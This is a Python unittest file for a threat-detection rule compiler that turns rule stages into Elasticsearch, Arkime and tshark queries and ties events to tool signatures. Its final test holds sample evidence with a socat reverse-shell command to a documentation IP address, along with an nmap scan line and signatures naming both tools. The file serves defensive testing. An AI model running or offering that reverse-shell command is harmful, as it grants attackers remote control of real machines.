import json
import unittest


class RuleModelTests(unittest.TestCase):
    def test_source_and_query_language_must_match(self):
        from romulus.intelligence.rule_model import RuleModelError, SourceStage

        with self.assertRaisesRegex(RuleModelError, "query language"):
            SourceStage.from_mapping({
                "stage_id": "stage-1",
                "source": "arkime",
                "query_language": "elasticsearch_dsl",
                "match": {"all": [{"role": "source.ip", "operator": "equals_any", "values": ["192.0.2.1"]}]},
            })

    def test_elasticsearch_compiler_uses_mapping_aware_operators(self):
        from romulus.intelligence.rule_model import SourceStage
        from romulus.intelligence.source_compilers import compile_source_stage

        stage = SourceStage.from_mapping({
            "stage_id": "stage-es",
            "source": "elasticsearch",
            "query_language": "elasticsearch_dsl",
            "match": {"all": [{"role": "process.command_line", "operator": "contains_any", "values": ["nmap"]}]},
        })
        query = compile_source_stage(
            stage,
            bindings={"process.command_line": ["process.command_line"]},
            field_metadata={
                "@timestamp": {"types": ["date"], "searchable": True},
                "process.command_line": {"types": ["keyword"], "searchable": True},
            },
            timestamp_field="@timestamp",
            time_range={"gte": "2026-01-01T00:00:00Z", "lte": "2026-01-02T00:00:00Z"},
        )

        encoded = json.dumps(query)
        self.assertIn("wildcard", encoded)
        self.assertIn("range", encoded)

    def test_arkime_compiler_escapes_literals(self):
        from romulus.intelligence.rule_model import SourceStage
        from romulus.intelligence.source_compilers import compile_source_stage

        stage = SourceStage.from_mapping({
            "stage_id": "stage-arkime",
            "source": "arkime",
            "query_language": "arkime",
            "match": {"all": [{"role": "dns.question", "operator": "equals_any", "values": ['bad"name.example']}]},
        })
        expression = compile_source_stage(stage, available_fields=["dns.host"])

        self.assertEqual(expression, 'dns.host == "bad\\"name.example"')

    def test_tshark_compiler_rejects_unavailable_fields(self):
        from romulus.intelligence.rule_model import SourceStage
        from romulus.intelligence.source_compilers import SourceCompileError, compile_source_stage

        stage = SourceStage.from_mapping({
            "stage_id": "stage-tshark",
            "source": "tshark",
            "query_language": "tshark",
            "match": {"all": [{"role": "dns.question", "operator": "contains_any", "values": ["example"]}]},
        })
        with self.assertRaisesRegex(SourceCompileError, "available field"):
            compile_source_stage(stage, available_fields=["ip.src"])

    def test_search_matrix_attributes_each_returned_event_to_matching_signatures(self):
        from romulus.intelligence.search_matrix import attribute_signature_hits

        catalog = {
            "signature_sets": {"tools": [
                {"id": "sig-nmap", "predicates": [{"role": "process.command_line", "operator": "contains_any", "values": ["nmap"]}]},
                {"id": "sig-socat", "predicates": [{"role": "process.command_line", "operator": "contains_any", "values": ["socat"]}]},
            ]},
            "families": [{
                "id": "process-tools", "signature_set": "tools", "source": "elasticsearch",
                "query_language": "elasticsearch_dsl", "selectors": [],
            }],
        }
        evidence = [
            {"evidence_id": "E-NMAP", "raw": {"process": {"command_line": "nmap -sV 192.0.2.2"}}},
            {"evidence_id": "E-SOCAT", "raw": {"process": {"command_line": "socat TCP:192.0.2.3:443 EXEC:/bin/sh"}}},
        ]

        matches = attribute_signature_hits(evidence, catalog, ["sig-nmap", "sig-socat"])

        self.assertEqual(matches, {"sig-nmap": ["E-NMAP"], "sig-socat": ["E-SOCAT"]})


if __name__ == "__main__":
    unittest.main()
